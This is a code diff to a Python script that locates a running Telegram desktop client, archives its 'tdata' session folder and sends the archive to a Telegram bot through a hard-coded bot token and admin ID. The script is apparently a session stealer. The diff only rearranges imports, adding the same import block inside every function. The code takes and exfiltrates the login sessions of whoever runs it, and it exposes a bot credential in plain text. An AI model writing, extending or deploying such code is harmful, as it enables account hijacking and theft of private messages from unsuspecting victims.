@@ -2,7 +2,7 @@ import psutil
 import os
 import zipfile
 import datetime
-import requests  # Import the requests library
+import requests 
 from requests.exceptions import RequestException
 
 BOT_TOKEN = "8174737942:AAEgCP12-jJ5ux9URaOoN3nFawHIakyEXDY"  
@@ -10,6 +10,12 @@ ADMIN_ID = "6761011723"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 def find_telegram_directory():
+    import psutil
+    import os
+    import zipfile
+    import datetime
+    import requests 
+    from requests.exceptions import RequestException
     for proc in psutil.process_iter(['pid', 'name', 'exe']):
         try:
             if proc.name().lower() == 'telegram.exe':
@@ -19,6 +25,12 @@ def find_telegram_directory():
     return None
 
 def create_archive(telegram_dir):
+    import psutil
+    import os
+    import zipfile
+    import datetime
+    import requests 
+    from requests.exceptions import RequestException
     tdata_dir = os.path.join(telegram_dir, 'tdata')
     if not os.path.exists(tdata_dir):
         return None
@@ -58,6 +70,12 @@ def create_archive(telegram_dir):
 
 
 def send_archive_to_bot_requests(archive_path):
+    import psutil
+    import os
+    import zipfile
+    import datetime
+    import requests 
+    from requests.exceptions import RequestException
     if not archive_path:
         return False
 
@@ -81,6 +99,12 @@ def send_archive_to_bot_requests(archive_path):
 
 
 if __name__ == '__main__':
+    import psutil
+    import os
+    import zipfile
+    import datetime
+    import requests 
+    from requests.exceptions import RequestException
     telegram_directory = find_telegram_directory()
 
     if telegram_directory:
